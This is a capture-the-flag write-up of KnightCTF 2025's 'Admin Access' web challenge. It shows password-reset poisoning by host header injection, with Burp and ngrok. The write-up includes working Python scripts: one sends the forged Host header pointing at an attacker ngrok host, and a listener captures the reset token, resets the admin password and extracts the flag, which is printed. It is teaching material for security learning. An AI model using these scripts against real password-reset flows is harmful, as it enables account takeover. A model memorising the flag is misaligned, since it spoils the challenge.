---
title: "Admin Access - KnightCTF 2025"
category: "web"
type: "writeup"
tags: ["hostheaderinjection", "web", "burp", "admin", "access", "knightctf", "knightctf-2025", "2025", "ctf-writeup"]
summary: "The site appeared as follows, with a login screen:"
source:
  name: "CTFtime writeup #39828"
  url: "https://ctftime.org/writeup/39828"
ctf:
  name: "KnightCTF 2025"
  year: 2025
  challenge: "Admin Access"
---

## Metadata

- **CTF:** KnightCTF 2025
- **Task:** Admin Access
- **Author team:** QnQSec
- **CTFtime tags:** hostheaderinjection, web
- **CTFtime:** <https://ctftime.org/writeup/39828>

---
### Initial Analysis

The site appeared as follows, with a login screen:

![login](<https://i.imgur.com/oEYgxMV.png>)

After completing the registration and login phase, you would enter a completely empty dashboard where the only available action was to log out. That’s when I realized that registering was pointless. Inspecting the page source, I found a strange comment:

![comment](<https://i.imgur.com/J5W8ZJG.png>)

the comment revealed an email, most likely belonging to the account containing the flag. Continuing to explore the site since it was a black-box challenge without any files I found the "Forgot Password" section:

![forgot](<https://i.imgur.com/kTCny7l.png>)

Where it was possible to specify an email to reset a password. At this point, I thought about resetting the password for the account associated with the email I had found earlier. And I considered a Host Header Injection.

### Exploit

So i started ngrok on port 80:

```  
ngrok http 80  
```

And then, using Burp Suite, I modified the Host header to `Host: ngrok_link`. By sending the request with the modified Host header through ngrok, I was able to extract the reset token from the previously sent "Forgot Password" request with the email [[email protected]](https://ctftime.org/cdn-cgi/l/email-protection):

![intercept](<https://i.imgur.com/fXFhS1s.png>)

After extracting the valid token, I reset the password using the obtained link and logged in with the account using the following credentials:

```  
username: kctf2025   
password: new_password  
```

![flag](<https://i.imgur.com/jQ6VR20.png>)

### Automated Exploit

I also created a fully automated exploit that performs the entire process described earlier:

```  
ngrok http 8080  
(set the ngrok url in the [request.py](http://request.py) file)  
python [exploit.py](http://exploit.py)  
python [request.py](http://request.py)  
```  
this is `[exploit.py](http://exploit.py)`: 

```python   
import http.server  
import socketserver  
import requests  
import re  
from urllib.parse import urlparse, parse_qs

class MyHandler(http.server.BaseHTTPRequestHandler):  
def do_GET(self):

# Extract the token parameter from the request  
token = parse_qs(urlparse(self.path).query).get('token', [None])[0]  
self.send_request(token)

def send_request(self, token):

s = requests.Session()  
url = "http://45.56.68.122:7474/"

password = "supermario45"  
data ={  
"token":token,  
"new_password":password  
}  
# Request for the password reset of the admin account  
[s.post](http://s.post)(url+"reset-password", data=data).text

credentials={  
"username":"kctf2025",  
"password":password  
}  
# Request login admin account with Flag extraction via Regex  
print("\nFLAG: " + re.search(r'KCTF{[^}]+}', [s.post](http://s.post)(url, data=credentials).text).group(0))

def start_server():  
PORT = 8080  
with socketserver.TCPServer(("", PORT), MyHandler) as httpd:  
httpd.serve_forever()

if __name__ == "__main__":  
start_server()  
```

and this is `[request.py](http://request.py)`:

```  
import requests

[requests.post](http://requests.post)("http://45.56.68.122:7474/forgot-password", data={"email":"[[email protected]](https://ctftime.org/cdn-cgi/l/email-protection)"}, headers={"Host":"6cde-93-70-84-224.ngrok-free.app"})  
```

### Flag  
```  
KCTF{PaSsW0rD_ReSet_p0is0n1ng_iS_FuN}  
```
